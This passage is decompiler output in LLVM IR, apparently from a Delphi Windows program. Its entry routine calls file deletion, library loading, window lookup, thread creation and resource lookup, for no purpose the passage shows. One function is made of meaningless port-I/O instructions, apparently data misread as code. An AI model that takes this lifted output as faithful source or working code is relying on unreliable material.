  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @function_4077ec(i32 %1, i32 %2, i32 %0, i32 %arg1, i32 %arg2), !insn.addr !2032
  ret i32 %3, !insn.addr !2033
}

define i32 @function_407874(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407874:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %arg3, 2975, !insn.addr !2034
  %2 = icmp eq i1 %1, false, !insn.addr !2035
  %spec.select = select i1 %2, i32 %arg3, i32 2974
  %3 = call i32 @function_4077ec(i32 %0, i32 %arg1, i32 %arg2, i32 %spec.select, i32 %arg4), !insn.addr !2036
  ret i32 %3, !insn.addr !2037
}

define i32 @function_4078a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_4078a4:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2038
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !2038
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !2038
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2039
  %2 = call i32 @"@LStrFromPChar"(), !insn.addr !2040
  %3 = call i32 @"@LStrPos"(), !insn.addr !2041
  %4 = icmp slt i32 %3, 1
  %spec.select = select i1 %4, i32 %arg4, i32 ptrtoint ([33 x i8]* @global_var_40797c to i32)
  %5 = call i32 @"@LStrFromPChar"(), !insn.addr !2042
  %6 = call i32 @"@LStrPos"(), !insn.addr !2043
  %7 = icmp slt i32 %6, 1
  %esi.0 = select i1 %7, i32 %arg3, i32 ptrtoint ([33 x i8]* @global_var_40797c to i32)
  %8 = call i32 @function_4077ec(i32 %arg1, i32 %arg2, i32 %esi.0, i32 %spec.select, i32 %arg5), !insn.addr !2044
  call void @__writefsdword(i32 0, i32 %arg6), !insn.addr !2045
  %9 = call i32 @"@LStrArrayClr"(), !insn.addr !2046
  ret i32 %9, !insn.addr !2047
}

define i32 @function_40793c() local_unnamed_addr {
dec_label_pc_40793c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2048
  ret i32 %0, !insn.addr !2048
}

define i32 @function_407941() local_unnamed_addr {
dec_label_pc_407941:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2049
}

define i32 @function_407943(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_407943:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2050
}

define i32 @function_407953() local_unnamed_addr {
dec_label_pc_407953:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2051
}

define i32 @function_4079a0() local_unnamed_addr {
dec_label_pc_4079a0:
  %0 = call i32 @function_407660(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_407a10, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_407a1c, i32 0, i32 0), i32 4225064), !insn.addr !2052
  store i32 %0, i32* @global_var_40810c, align 4, !insn.addr !2053
  %1 = call i32 @function_407660(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_407a10, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_407a38, i32 0, i32 0), i32 4225140), !insn.addr !2054
  store i32 %1, i32* @global_var_408110, align 4, !insn.addr !2055
  %2 = call i32 @function_407660(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_407a50, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_407a5c, i32 0, i32 0), i32 4225188), !insn.addr !2056
  store i32 %2, i32* @global_var_408114, align 4, !insn.addr !2057
  ret i32 %2, !insn.addr !2058
}

define i32 @function_407a10(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12, i32 %arg13, i32 %arg14) local_unnamed_addr {
dec_label_pc_407a10:
  %merge.reg2mem = alloca i32, !insn.addr !2059
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %6 = call i32 @__decompiler_undefined_function_0()
  %7 = call i1 @__decompiler_undefined_function_1()
  %8 = call i1 @__decompiler_undefined_function_1()
  %9 = call i32 @__decompiler_undefined_function_0()
  %10 = icmp eq i1 %7, false, !insn.addr !2059
  br i1 %10, label %dec_label_pc_407a3f, label %dec_label_pc_407a12, !insn.addr !2059

dec_label_pc_407a12:                              ; preds = %dec_label_pc_407a10
  br i1 %8, label %dec_label_pc_407a48, label %dec_label_pc_407a15, !insn.addr !2060

dec_label_pc_407a15:                              ; preds = %dec_label_pc_407a12
  %11 = trunc i32 %4 to i16, !insn.addr !2061
  %12 = call i8 @__asm_insb(i16 %11), !insn.addr !2061
  %13 = inttoptr i32 %0 to i8*, !insn.addr !2061
  store i8 %12, i8* %13, align 1, !insn.addr !2061
  %14 = call i8 @__asm_insb(i16 %11), !insn.addr !2062
  store i8 %14, i8* %13, align 1, !insn.addr !2062
  %15 = bitcast i32* %eax to i8*
  %16 = load i8, i8* %15, align 4, !insn.addr !2063
  %17 = load i32, i32* %eax, align 4
  %18 = trunc i32 %17 to i8, !insn.addr !2063
  %19 = add i8 %16, %18, !insn.addr !2063
  %20 = inttoptr i32 %17 to i8*, !insn.addr !2063
  store i8 %19, i8* %20, align 1, !insn.addr !2063
  call void @__asm_outsd(i16 %11, i32 %1), !insn.addr !2064
  %21 = trunc i32 %arg10 to i16, !insn.addr !2065
  %22 = call i32 @__asm_insd(i16 %21), !insn.addr !2065
  %23 = inttoptr i32 %9 to i32*, !insn.addr !2065
  store i32 %22, i32* %23, align 4, !insn.addr !2065
  store i32 %arg1, i32* %eax, align 4, !insn.addr !2066
  %24 = inttoptr i32 %arg1 to i8*, !insn.addr !2067
  %25 = load i8, i8* %24, align 1, !insn.addr !2067
  %26 = trunc i32 %arg1 to i8, !insn.addr !2067
  %27 = add i8 %25, %26, !insn.addr !2067
  store i8 %27, i8* %24, align 1, !insn.addr !2067
  %28 = trunc i32 %arg3 to i16, !insn.addr !2068
  %29 = inttoptr i32 %arg6 to i32*, !insn.addr !2068
  %30 = load i32, i32* %29, align 4, !insn.addr !2068
  call void @__asm_outsd(i16 %28, i32 %30), !insn.addr !2068
  %31 = add i32 %arg5, 67, !insn.addr !2069
  %32 = and i32 %31, 65535
  %33 = inttoptr i32 %32 to i32*, !insn.addr !2069
  %34 = load i32, i32* %33, align 4, !insn.addr !2069
  %35 = load i8, i8* %24, align 1, !insn.addr !2070
  %36 = add i8 %35, %26, !insn.addr !2070
  store i8 %36, i8* %24, align 1, !insn.addr !2070
  %37 = mul i32 %34, 1557718248, !insn.addr !2071
  %38 = add i32 %arg7, 97, !insn.addr !2071
  %39 = add i32 %38, %37, !insn.addr !2071
  %40 = inttoptr i32 %39 to i8*, !insn.addr !2071
  %41 = load i8, i8* %40, align 1, !insn.addr !2071
  %42 = trunc i32 %arg2 to i8
  %43 = add i8 %42, 1, !insn.addr !2071
  %44 = add i8 %43, %41, !insn.addr !2071
  %45 = icmp eq i8 %44, 0, !insn.addr !2071
  store i8 %44, i8* %40, align 1, !insn.addr !2071
  %46 = load i32, i32* %eax, align 4
  store i32 %46, i32* %merge.reg2mem, !insn.addr !2072
  br i1 %45, label %dec_label_pc_407ab1, label %dec_label_pc_407a3f, !insn.addr !2072

dec_label_pc_407a3f:                              ; preds = %dec_label_pc_407a10, %dec_label_pc_407a15
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !2073

dec_label_pc_407a48:                              ; preds = %dec_label_pc_407a12
  %47 = trunc i32 %6 to i8
  %48 = mul i8 %47, 2, !insn.addr !2074
  %49 = inttoptr i32 %6 to i8*, !insn.addr !2074
  store i8 %48, i8* %49, align 1, !insn.addr !2074
  %50 = add i32 %3, 104, !insn.addr !2075
  %51 = inttoptr i32 %50 to i8*, !insn.addr !2075
  %52 = load i8, i8* %51, align 1, !insn.addr !2075
  %53 = udiv i32 %4, 256, !insn.addr !2075
  %54 = trunc i32 %53 to i8, !insn.addr !2075
  %55 = add i8 %52, %54, !insn.addr !2075
  store i8 %55, i8* %51, align 1, !insn.addr !2075
  %56 = trunc i32 %4 to i16, !insn.addr !2076
  %57 = call i8 @__asm_insb(i16 %56), !insn.addr !2076
  %58 = inttoptr i32 %0 to i8*, !insn.addr !2076
  store i8 %57, i8* %58, align 1, !insn.addr !2076
  %59 = call i8 @__asm_insb(i16 %56), !insn.addr !2077
  store i8 %59, i8* %58, align 1, !insn.addr !2077
  %60 = call i8 @__asm_insb(i16 %56), !insn.addr !2078
  store i8 %60, i8* %58, align 1, !insn.addr !2078
  %61 = call i8 @__asm_insb(i16 %56), !insn.addr !2079
  store i8 %61, i8* %58, align 1, !insn.addr !2079
  %62 = load i8, i8* %51, align 1, !insn.addr !2080
  %63 = trunc i32 %4 to i8, !insn.addr !2080
  %64 = add i8 %62, %63, !insn.addr !2080
  store i8 %64, i8* %51, align 1, !insn.addr !2080
  %65 = call i8 @__asm_insb(i16 %56), !insn.addr !2081
  store i8 %65, i8* %58, align 1, !insn.addr !2081
  %66 = call i8 @__asm_insb(i16 %56), !insn.addr !2082
  store i8 %66, i8* %58, align 1, !insn.addr !2082
  %67 = add i32 %2, 1, !insn.addr !2083
  %68 = icmp slt i32 %67, 0, !insn.addr !2083
  br i1 %68, label %dec_label_pc_407ac9, label %dec_label_pc_407a64, !insn.addr !2084

dec_label_pc_407a64:                              ; preds = %dec_label_pc_407a48
  %69 = mul i32 %1, 256
  %70 = and i32 %69, 65280
  %71 = xor i32 %5, %70, !insn.addr !2085
  %72 = xor i32 %4, %1, !insn.addr !2086
  %73 = bitcast i32* %eax to i8*
  %74 = add i32 %2, 117, !insn.addr !2087
  %75 = inttoptr i32 %74 to i16*, !insn.addr !2087
  %76 = load i16, i16* %75, align 2, !insn.addr !2087
  %77 = trunc i32 %72 to i16, !insn.addr !2087
  call void @__asm_arpl(i16 %76, i16 %77), !insn.addr !2087
  %78 = load i8, i8* %73, align 4, !insn.addr !2088
  %79 = load i32, i32* %eax, align 4
  %80 = trunc i32 %79 to i8, !insn.addr !2088
  %81 = add i8 %78, %80, !insn.addr !2088
  %82 = inttoptr i32 %79 to i8*, !insn.addr !2088
  store i8 %81, i8* %82, align 1, !insn.addr !2088
  %83 = add i32 %71, 82, !insn.addr !2089
  %84 = inttoptr i32 %83 to i8*, !insn.addr !2089
  %85 = load i8, i8* %84, align 1, !insn.addr !2089
  %86 = add i8 %85, %63, !insn.addr !2089
  store i8 %86, i8* %84, align 1, !insn.addr !2089
  %87 = load i32, i32* %eax, align 4, !insn.addr !2090
  %88 = add i32 %87, -1, !insn.addr !2090
  %89 = add i32 %71, 4227341, !insn.addr !2091
  %90 = inttoptr i32 %89 to i8*, !insn.addr !2091
  %91 = load i8, i8* %90, align 1, !insn.addr !2091
  %92 = udiv i32 %88, 256, !insn.addr !2091
  %93 = trunc i32 %92 to i8, !insn.addr !2091
  %94 = add i8 %91, %93, !insn.addr !2091
  store i8 %94, i8* %90, align 1, !insn.addr !2091
  ret i32 %88, !insn.addr !2091

dec_label_pc_407ab1:                              ; preds = %dec_label_pc_407a15
  %95 = add i32 %46, 1, !insn.addr !2092
  store i32 %95, i32* %eax, align 4, !insn.addr !2092
  %96 = inttoptr i32 %arg4 to i8*, !insn.addr !2093
  %97 = load i8, i8* %96, align 1, !insn.addr !2093
  %98 = udiv i32 %arg3, 256, !insn.addr !2093
  %99 = trunc i32 %98 to i8, !insn.addr !2093
  %100 = add i8 %97, %99, !insn.addr !2093
  store i8 %100, i8* %96, align 1, !insn.addr !2093
  %101 = add i32 %arg3, 89, !insn.addr !2094
  %102 = inttoptr i32 %101 to i8*, !insn.addr !2094
  store i8 -1, i8* %102, align 1, !insn.addr !2094
  call void @__writefsdword(i32 %95, i32 %arg3), !insn.addr !2095
  %103 = load i32, i32* %eax, align 4, !insn.addr !2096
  ret i32 %103, !insn.addr !2096

dec_label_pc_407ac9:                              ; preds = %dec_label_pc_407a48
  %104 = load i32, i32* %eax, align 4, !insn.addr !2097
  ret i32 %104, !insn.addr !2097
}

define i32 @function_407acc() local_unnamed_addr {
dec_label_pc_407acc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f4, align 4, !insn.addr !2098
  %2 = add i32 %1, -1, !insn.addr !2098
  store i32 %2, i32* @global_var_4096f4, align 4, !insn.addr !2098
  ret i32 %0, !insn.addr !2099
}

define i32 @function_407ad4() local_unnamed_addr {
dec_label_pc_407ad4:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2100
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2100
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2100
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2101
  %2 = load i32, i32* @global_var_4096f8, align 4, !insn.addr !2102
  %3 = add i32 %2, 1, !insn.addr !2102
  store i32 %3, i32* @global_var_4096f8, align 4, !insn.addr !2102
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2103
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2104
  ret i32 0, !insn.addr !2105
}

define i32 @function_407af9() local_unnamed_addr {
dec_label_pc_407af9:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2106
  ret i32 %0, !insn.addr !2106
}

define i32 @function_407afe() local_unnamed_addr {
dec_label_pc_407afe:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2107
}

define i32 @function_407b00(i32 %arg1) local_unnamed_addr {
dec_label_pc_407b00:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2108
}

define i32 @function_407b04() local_unnamed_addr {
dec_label_pc_407b04:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f8, align 4, !insn.addr !2109
  %2 = add i32 %1, -1, !insn.addr !2109
  store i32 %2, i32* @global_var_4096f8, align 4, !insn.addr !2109
  ret i32 %0, !insn.addr !2110
}

define i32 @function_407b0c() local_unnamed_addr {
dec_label_pc_407b0c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2111
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2111
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2111
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2112
  %2 = load i32, i32* @global_var_4096fc, align 4, !insn.addr !2113
  %3 = add i32 %2, 1, !insn.addr !2113
  store i32 %3, i32* @global_var_4096fc, align 4, !insn.addr !2113
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2114
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2115
  ret i32 0, !insn.addr !2116
}

define i32 @function_407b31() local_unnamed_addr {
dec_label_pc_407b31:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2117
  ret i32 %0, !insn.addr !2117
}

define i32 @function_407b36() local_unnamed_addr {
dec_label_pc_407b36:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2118
}

define i32 @function_407b38(i32 %arg1) local_unnamed_addr {
dec_label_pc_407b38:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2119
}

define i32 @function_407b3c() local_unnamed_addr {
dec_label_pc_407b3c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096fc, align 4, !insn.addr !2120
  %2 = add i32 %1, -1, !insn.addr !2120
  store i32 %2, i32* @global_var_4096fc, align 4, !insn.addr !2120
  ret i32 %0, !insn.addr !2121
}

define i32 @function_407b44() local_unnamed_addr {
dec_label_pc_407b44:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2122
}

define i32 @SetFieldText.50() local_unnamed_addr {
dec_label_pc_407b6f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2123
  ret i32 %0, !insn.addr !2123
}

define i32 @function_407b74() local_unnamed_addr {
dec_label_pc_407b74:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2124
}

define i32 @function_407b76(i32 %arg1) local_unnamed_addr {
dec_label_pc_407b76:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2125
}

define i32 @entry_point() local_unnamed_addr {
dec_label_pc_407c80:
  %esp.2.reg2mem = alloca i32, !insn.addr !2126
  %esp.1.reg2mem = alloca i32, !insn.addr !2126
  %esp.0.reg2mem = alloca i32, !insn.addr !2126
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-136 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %1 = call i32 @"@InitLib"(i32 %0), !insn.addr !2127
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !2128
  store i32 %2, i32* %stack_var_-116, align 4, !insn.addr !2128
  %3 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !2128
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !2129
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !2130
  %4 = call i32 @GetModuleFileNameA(i32* inttoptr (i32 260 to i32*), i8* bitcast (i8** @global_var_409700 to i8*), i32 0), !insn.addr !2131
  %5 = add i32 %4, ptrtoint (i8** @global_var_409700 to i32), !insn.addr !2132
  %6 = inttoptr i32 %5 to i8*, !insn.addr !2132
  store i8 0, i8* %6, align 1, !insn.addr !2132
  %7 = call i32 @"@LStrFromArray"(), !insn.addr !2133
  %8 = call i32 @function_40708c(), !insn.addr !2134
  %9 = call i32 @"@LStrAsg"(), !insn.addr !2135
  %10 = call i32 @function_407104(), !insn.addr !2136
  %11 = trunc i32 %10 to i8, !insn.addr !2137
  %12 = icmp eq i8 %11, 0, !insn.addr !2137
  br i1 %12, label %dec_label_pc_407d87, label %dec_label_pc_407d0c, !insn.addr !2138

dec_label_pc_407d0c:                              ; preds = %dec_label_pc_407c80
  %13 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2139
  %14 = inttoptr i32 %13 to i32*, !insn.addr !2140
  store i32 -1, i32* %14, align 4, !insn.addr !2140
  %15 = call i32 @"@LStrFromArray"(), !insn.addr !2141
  %16 = call i32 @function_4070cc(), !insn.addr !2142
  %17 = call i32 @"@LStrAsg"(), !insn.addr !2143
  %18 = call i32 @"@LStrCat3"(), !insn.addr !2144
  %19 = call i32 @function_4036c8(), !insn.addr !2145
  %20 = inttoptr i32 %19 to i8*, !insn.addr !2146
  %21 = call i1 @DeleteFileA(i8* %20), !insn.addr !2147
  %22 = call i32 @"@LStrCat3"(), !insn.addr !2148
  %23 = call i32 @function_4036c8(), !insn.addr !2149
  %24 = inttoptr i32 %23 to i8*, !insn.addr !2150
  store i8* %24, i8** %stack_var_-136, align 4, !insn.addr !2150
  %25 = ptrtoint i8** %stack_var_-136 to i32, !insn.addr !2150
  %26 = call i32* @LoadLibraryA(i8* %24), !insn.addr !2151
  %27 = ptrtoint i32* %26 to i32, !insn.addr !2151
  store i32 %27, i32* @global_var_408118, align 4, !insn.addr !2152
  store i32 %25, i32* %esp.0.reg2mem, !insn.addr !2153
  br label %dec_label_pc_407db4, !insn.addr !2153

dec_label_pc_407d87:                              ; preds = %dec_label_pc_407c80
  %28 = ptrtoint i32* %stack_var_-128 to i32, !insn.addr !2130
  %29 = call i32 @function_4060f0(), !insn.addr !2154
  %30 = call i32 @function_407104(), !insn.addr !2155
  %31 = trunc i32 %30 to i8, !insn.addr !2156
  %32 = icmp eq i8 %31, 0, !insn.addr !2156
  store i32 %28, i32* %esp.2.reg2mem, !insn.addr !2157
  br i1 %32, label %dec_label_pc_407ef6, label %dec_label_pc_407da9, !insn.addr !2157

dec_label_pc_407da9:                              ; preds = %dec_label_pc_407d87
  %33 = load i32, i32* @global_var_408138, align 4, !insn.addr !2158
  %34 = inttoptr i32 %33 to i32*, !insn.addr !2159
  store i32 -1, i32* %34, align 4, !insn.addr !2159
  store i32 %28, i32* %esp.0.reg2mem, !insn.addr !2159
  br label %dec_label_pc_407db4, !insn.addr !2159

dec_label_pc_407db4:                              ; preds = %dec_label_pc_407da9, %dec_label_pc_407d0c
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %35 = add i32 %esp.0.reload, -4, !insn.addr !2160
  %36 = inttoptr i32 %35 to i32*, !insn.addr !2160
  store i32 260, i32* %36, align 4, !insn.addr !2160
  %37 = add i32 %esp.0.reload, -8, !insn.addr !2161
  %38 = inttoptr i32 %37 to i32*, !insn.addr !2161
  store i32 ptrtoint (i8** @global_var_409700 to i32), i32* %38, align 4, !insn.addr !2161
  %39 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4, !insn.addr !2162
  %40 = ptrtoint i32 (i32, i32, i32)* %39 to i32, !insn.addr !2162
  %41 = add i32 %esp.0.reload, -12, !insn.addr !2163
  %42 = inttoptr i32 %41 to i32*, !insn.addr !2163
  store i32 %40, i32* %42, align 4, !insn.addr !2163
  %43 = call i32 @GetModuleFileNameA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !2164
  %44 = add i32 %43, ptrtoint (i8** @global_var_409700 to i32), !insn.addr !2165
  %45 = inttoptr i32 %44 to i8*, !insn.addr !2165
  store i8 0, i8* %45, align 1, !insn.addr !2165
  %46 = call i32 @"@LStrFromArray"(), !insn.addr !2166
  %47 = call i32 @function_4070cc(), !insn.addr !2167
  %48 = call i32 @"@LStrAsg"(), !insn.addr !2168
  %49 = call i32 @"@LStrCat3"(), !insn.addr !2169
  %50 = load i32, i32* @global_var_408138, align 4, !insn.addr !2170
  %51 = icmp eq i32 %50, 0, !insn.addr !2170
  br i1 %51, label %dec_label_pc_407e4d, label %dec_label_pc_407e1a, !insn.addr !2171

dec_label_pc_407e1a:                              ; preds = %dec_label_pc_407db4
  %52 = add i32 %esp.0.reload, -16, !insn.addr !2172
  %53 = inttoptr i32 %52 to i32*, !insn.addr !2172
  store i32 ptrtoint ([16 x i8]* @global_var_407f78 to i32), i32* %53, align 4, !insn.addr !2172
  %54 = add i32 %esp.0.reload, -20, !insn.addr !2173
  %55 = inttoptr i32 %54 to i32*, !insn.addr !2173
  store i32 ptrtoint ([8 x i8]* @global_var_407f88 to i32), i32* %55, align 4, !insn.addr !2173
  %56 = call i32* @FindWindowA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2174
  %57 = icmp eq i32* %56, null, !insn.addr !2175
  %58 = icmp eq i1 %57, false, !insn.addr !2176
  store i32 %54, i32* %esp.2.reg2mem, !insn.addr !2176
  br i1 %58, label %dec_label_pc_407ef6, label %dec_label_pc_407e31, !insn.addr !2176

dec_label_pc_407e31:                              ; preds = %dec_label_pc_407e1a
  %59 = add i32 %esp.0.reload, -24, !insn.addr !2177
  %60 = inttoptr i32 %59 to i32*, !insn.addr !2177
  store i32 ptrtoint (i32* @global_var_409810 to i32), i32* %60, align 4, !insn.addr !2177
  %61 = add i32 %esp.0.reload, -28, !insn.addr !2178
  %62 = inttoptr i32 %61 to i32*, !insn.addr !2178
  store i32 0, i32* %62, align 4, !insn.addr !2178
  %63 = add i32 %esp.0.reload, -32, !insn.addr !2179
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2179
  store i32 66, i32* %64, align 4, !insn.addr !2179
  %65 = add i32 %esp.0.reload, -36, !insn.addr !2180
  %66 = inttoptr i32 %65 to i32*, !insn.addr !2180
  store i32 4220780, i32* %66, align 4, !insn.addr !2180
  %67 = add i32 %esp.0.reload, -40, !insn.addr !2181
  %68 = inttoptr i32 %67 to i32*, !insn.addr !2181
  store i32 0, i32* %68, align 4, !insn.addr !2181
  %69 = add i32 %esp.0.reload, -44, !insn.addr !2182
  %70 = inttoptr i32 %69 to i32*, !insn.addr !2182
  store i32 0, i32* %70, align 4, !insn.addr !2182
  %71 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2183
  store i32 %69, i32* %esp.2.reg2mem, !insn.addr !2184
  br label %dec_label_pc_407ef6, !insn.addr !2184

dec_label_pc_407e4d:                              ; preds = %dec_label_pc_407db4
  %72 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2185
  %73 = icmp eq i32 %72, 0, !insn.addr !2185
  store i32 %41, i32* %esp.2.reg2mem, !insn.addr !2186
  br i1 %73, label %dec_label_pc_407ef6, label %dec_label_pc_407e5b, !insn.addr !2186

dec_label_pc_407e5b:                              ; preds = %dec_label_pc_407e4d
  %74 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !2187
  %75 = icmp eq i8 %74, 0, !insn.addr !2187
  br i1 %75, label %dec_label_pc_407e6a, label %dec_label_pc_407e65, !insn.addr !2188

dec_label_pc_407e65:                              ; preds = %dec_label_pc_407e5b
  %76 = call i32 @function_40692c(), !insn.addr !2189
  br label %dec_label_pc_407e6a, !insn.addr !2189

dec_label_pc_407e6a:                              ; preds = %dec_label_pc_407e65, %dec_label_pc_407e5b
  %77 = load i32, i32* @global_var_408148, align 4, !insn.addr !2190
  %78 = icmp slt i32 %77, 1, !insn.addr !2191
  br i1 %78, label %dec_label_pc_407ea7, label %dec_label_pc_407e74, !insn.addr !2191

dec_label_pc_407e74:                              ; preds = %dec_label_pc_407e6a
  %79 = call i32 @function_404d38(), !insn.addr !2192
  %80 = call i32 @"@LStrCmp"(), !insn.addr !2193
  %81 = load i32, i32* @global_var_408154, align 4, !insn.addr !2194
  %82 = inttoptr i32 %81 to i32*, !insn.addr !2195
  store i32 -1, i32* %82, align 4, !insn.addr !2195
  %83 = load i32, i32* @global_var_408154, align 4, !insn.addr !2196
  %84 = icmp eq i32 %83, 0, !insn.addr !2196
  br i1 %84, label %dec_label_pc_407ea7, label %dec_label_pc_407ea2, !insn.addr !2197

dec_label_pc_407ea2:                              ; preds = %dec_label_pc_407e74
  %85 = call i32 @function_40600c(), !insn.addr !2198
  br label %dec_label_pc_407ea7, !insn.addr !2198

dec_label_pc_407ea7:                              ; preds = %dec_label_pc_407ea2, %dec_label_pc_407e74, %dec_label_pc_407e6a
  %86 = add i32 %esp.0.reload, -16, !insn.addr !2199
  %87 = inttoptr i32 %86 to i32*, !insn.addr !2199
  store i32 3, i32* %87, align 4, !insn.addr !2199
  %88 = add i32 %esp.0.reload, -20, !insn.addr !2200
  %89 = inttoptr i32 %88 to i32*, !insn.addr !2200
  store i32 16065, i32* %89, align 4, !insn.addr !2200
  %90 = load i32, i32* @global_var_408118, align 4, !insn.addr !2201
  %91 = add i32 %esp.0.reload, -24, !insn.addr !2202
  %92 = inttoptr i32 %91 to i32*, !insn.addr !2202
  store i32 %90, i32* %92, align 4, !insn.addr !2202
  %93 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2203
  %94 = icmp eq i32* %93, null, !insn.addr !2204
  %95 = icmp eq i1 %94, false, !insn.addr !2205
  store i32 %91, i32* %esp.1.reg2mem, !insn.addr !2205
  br i1 %95, label %dec_label_pc_407ee7, label %dec_label_pc_407ebd, !insn.addr !2205

dec_label_pc_407ebd:                              ; preds = %dec_label_pc_407ea7
  %96 = add i32 %esp.0.reload, -28, !insn.addr !2206
  %97 = inttoptr i32 %96 to i32*, !insn.addr !2206
  store i32 14, i32* %97, align 4, !insn.addr !2206
  %98 = add i32 %esp.0.reload, -32, !insn.addr !2207
  %99 = inttoptr i32 %98 to i32*, !insn.addr !2207
  store i32 16065, i32* %99, align 4, !insn.addr !2207
  %100 = load i32, i32* @global_var_408118, align 4, !insn.addr !2208
  %101 = add i32 %esp.0.reload, -36, !insn.addr !2209
  %102 = inttoptr i32 %101 to i32*, !insn.addr !2209
  store i32 %100, i32* %102, align 4, !insn.addr !2209
  %103 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2210
  %104 = icmp eq i32* %103, null, !insn.addr !2211
  %105 = icmp eq i1 %104, false, !insn.addr !2212
  store i32 %101, i32* %esp.1.reg2mem, !insn.addr !2212
  br i1 %105, label %dec_label_pc_407ee7, label %dec_label_pc_407ed3, !insn.addr !2212

dec_label_pc_407ed3:                              ; preds = %dec_label_pc_407ebd
  %106 = add i32 %esp.0.reload, -40, !insn.addr !2213
  %107 = inttoptr i32 %106 to i32*, !insn.addr !2213
  store i32 16065, i32* %107, align 4, !insn.addr !2213
  %108 = load i32, i32* @global_var_408118, align 4, !insn.addr !2214
  %109 = add i32 %esp.0.reload, -44, !insn.addr !2215
  %110 = inttoptr i32 %109 to i32*, !insn.addr !2215
  store i32 %108, i32* %110, align 4, !insn.addr !2215
  %111 = call i32* @LoadIconA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !2216
